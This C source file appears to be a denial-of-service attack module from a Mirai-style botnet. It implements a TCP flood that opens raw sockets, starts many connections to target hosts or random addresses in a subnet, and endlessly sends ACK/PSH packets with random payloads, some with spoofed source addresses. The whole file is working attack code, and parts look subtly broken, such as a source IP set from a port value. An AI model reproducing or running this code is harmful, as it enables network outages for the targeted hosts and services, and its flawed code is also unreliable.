#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"

#define EXTERO_MAX_SESS 2048

struct extero_session {
    uint32_t target_addr;
    uint16_t sport, dport;
    uint32_t seq, ack_seq;
    int conn_sock, raw_sock;
    int flood;
};

void attack_method_exterogen(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, flood_sessions, stream_sessions, total_sessions;
    uint16_t dport, adv_window;
    uint32_t sndbuf, rcvbuf;
    uint8_t ip_ttl;
    struct extero_session *sessions;

    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    flood_sessions = attack_get_opt_int(opts_len, opts, ATK_OPT_FLOOD, 6);
    stream_sessions = attack_get_opt_int(opts_len, opts, ATK_OPT_STREAM, 12);
    adv_window = attack_get_opt_int(opts_len, opts, ATK_OPT_WINDOW, 65535);
    sndbuf = attack_get_opt_int(opts_len, opts, ATK_OPT_CONN_SNDBUF, 4194304);
    rcvbuf = attack_get_opt_int(opts_len, opts, ATK_OPT_CONN_RCVBUF, 4194304);
    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);

    if (flood_sessions < 1) flood_sessions = 1;
    if (flood_sessions > 16) flood_sessions = 16;
    if (stream_sessions < 1) stream_sessions = 1;
    if (stream_sessions > 32) stream_sessions = 32;
    if (adv_window < 1024) adv_window = 1024;
    total_sessions = flood_sessions + stream_sessions;
    if (total_sessions > EXTERO_MAX_SESS) total_sessions = EXTERO_MAX_SESS;

    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw_sock < 0) raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock < 0) return;
    int one = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) < 0) { close(raw_sock); return; }
    i = 16 * 1024 * 1024;
    setsockopt(raw_sock, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));

    sessions = calloc(total_sessions, sizeof(struct extero_session));
    if (!sessions) { close(raw_sock); return; }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(dport);

    for (i = 0; i < total_sessions; i++) {
        uint32_t taddr = targs[i % targs_len].netmask < 32 ?
            htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask)) : targs[i % targs_len].addr;

        sessions[i].target_addr = taddr;
        sessions[i].dport = dport;
        sessions[i].sport = htons(rand_next() % 60000 + 1024);
        sessions[i].flood = i < flood_sessions ? 1 : 0;
        sessions[i].raw_sock = raw_sock;
        sessions[i].conn_sock = -1;

        int cs = socket(AF_INET, SOCK_STREAM, 0);
        if (cs < 0) continue;
        fcntl(cs, F_SETFL, O_NONBLOCK | fcntl(cs, F_GETFL, 0));

        int buf = sndbuf;
        setsockopt(cs, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
        buf = rcvbuf;
        setsockopt(cs, SOL_SOCKET, SO_RCVBUF, &buf, sizeof(buf));

        target.sin_addr.s_addr = taddr;
        connect(cs, (struct sockaddr *)&target, sizeof(target));
        sessions[i].conn_sock = cs;

        if (sessions[i].flood)
            continue;

        uint32_t this_sport = 0;
        struct sockaddr_in bindinfo;
        socklen_t bl = sizeof(bindinfo);
        if (getsockname(cs, (struct sockaddr *)&bindinfo, &bl) == 0)
            this_sport = ntohs(bindinfo.sin_port);
        if (this_sport) sessions[i].sport = htons(this_sport);

        time_t hs_end = time(NULL) + 15;
        char rbuf[576];
        while (time(NULL) < hs_end) {
            struct sockaddr_in from;
            socklen_t fl = sizeof(from);
            fd_set rfds; FD_ZERO(&rfds); FD_SET(raw_sock, &rfds);
            struct timeval tv = {0, 150000};
            if (select(raw_sock + 1, &rfds, NULL, NULL, &tv) <= 0) continue;

            int r = recvfrom(raw_sock, rbuf, sizeof(rbuf), MSG_DONTWAIT, (struct sockaddr *)&from, &fl);
            if (r < (int)(sizeof(struct iphdr) + sizeof(struct tcphdr))) continue;
            if (from.sin_addr.s_addr != taddr) continue;

            struct iphdr *iph = (struct iphdr *)rbuf;
            int iphl = iph->ihl * 4;
            if (iph->protocol != IPPROTO_TCP || r < iphl + (int)sizeof(struct tcphdr)) continue;
            struct tcphdr *tcph = (struct tcphdr *)(rbuf + iphl);
            if (tcph->source != htons(dport)) continue;
            if (tcph->syn && tcph->ack) {
                sessions[i].seq = ntohl(tcph->ack_seq);
                sessions[i].ack_seq = ntohl(tcph->seq) + 1;
                break;
            }
        }
    }

    int pkt_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + 512;
    char pkt[pkt_size];
    struct iphdr *iph = (struct iphdr *)pkt;
    struct tcphdr *tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));
    char *payload = pkt + sizeof(struct iphdr) + sizeof(struct tcphdr);
    char chk_data[sizeof(struct tcphdr) + 512];

    while (TRUE) {
        for (i = 0; i < total_sessions; i++) {
            if (sessions[i].conn_sock < 0) continue;

            memset(iph, 0, sizeof(*iph));
            iph->version = 4;
            iph->ihl = 5;
            iph->tot_len = htons(pkt_size);
            iph->id = htons(rand_next() & 0xFFFF);
            iph->ttl = ip_ttl;
            iph->protocol = IPPROTO_TCP;
            iph->saddr = sessions[i].flood ? rand_next() : sessions[i].sport;
            iph->daddr = sessions[i].target_addr;

            memset(tcph, 0, sizeof(*tcph));
            tcph->source = sessions[i].sport;
            tcph->dest = htons(dport);
            tcph->doff = 5;
            tcph->window = htons(adv_window);
            if (sessions[i].flood) {
                tcph->ack = 1;
                tcph->psh = 1;
                tcph->seq = htonl(rand_next());
                tcph->ack_seq = htonl(rand_next());
            } else {
                tcph->ack = 1;
                tcph->seq = htonl(sessions[i].seq);
                sessions[i].seq++;
                tcph->ack_seq = htonl(sessions[i].ack_seq);
            }

            rand_str(payload, 512);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(*iph));
            util_memcpy(chk_data, tcph, sizeof(*tcph) + 512);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(*tcph) + 512), sizeof(*tcph) + 512);

            target.sin_addr.s_addr = sessions[i].target_addr;
            sendto(raw_sock, pkt, pkt_size, MSG_NOSIGNAL, (struct sockaddr *)&target, sizeof(target));
        }
    }

    free(sessions);
    close(raw_sock);
}
